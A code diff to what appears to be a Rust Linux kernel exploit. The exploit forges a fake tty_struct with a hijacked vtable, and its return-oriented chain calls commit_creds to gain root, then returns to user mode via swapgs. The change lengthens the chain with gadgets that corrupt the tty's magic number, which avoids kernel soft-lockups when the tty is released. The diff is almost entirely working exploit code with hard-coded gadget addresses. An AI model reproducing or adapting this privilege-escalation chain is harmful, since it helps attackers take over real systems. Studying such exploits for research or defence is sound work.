@@ -11,7 +11,7 @@ struct FakeTty {
     pub index: u64,
     pub ldisc_sem: [u64; 6],
     pub vtable: [u64; 36],
-    pub chain: [u64; 10],
+    pub chain: [u64; 13],
     pub frame: TrapFrame64,
 }
 
@@ -74,6 +74,16 @@ fn main() {
         0xffffffff81788e0e,
         // commit_creds
         0xffffffff810a1420,
+        // Corrupt tty_struct's magic number (this works around kernel
+        // soft-lockups upon tty_release())
+        // Ideally, we should either completely skip the release step (e.g.
+        // by overwriting the "release" function in fops), or restore the
+        // contents of tty_struct before closing the fd.
+        // pop rdi ; ret
+        0xffffffff810d238d,
+        tty_struct_addr - 0x10,
+        // mov dword [rdi + 0x10], eax ; ret
+        0xffffffff813b9ed7,
         // swapgs ; pop rbp ; ret
         0xffffffff81063694,
         0xdeadbeef,
